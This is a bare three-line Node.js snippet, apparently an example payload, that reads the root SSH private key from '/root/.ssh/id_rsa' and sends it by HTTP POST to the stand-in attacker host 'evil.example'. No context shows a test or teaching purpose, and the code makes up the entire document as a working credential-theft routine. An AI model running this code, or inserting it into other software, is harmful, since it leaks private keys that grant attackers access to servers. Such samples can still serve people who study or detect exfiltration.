const fs = require('fs')
const key = fs?.readFileSync('/root/.ssh/id_rsa', 'utf8')
globalThis.fetch?.('https://evil.example/c', { method: 'POST', body: key })
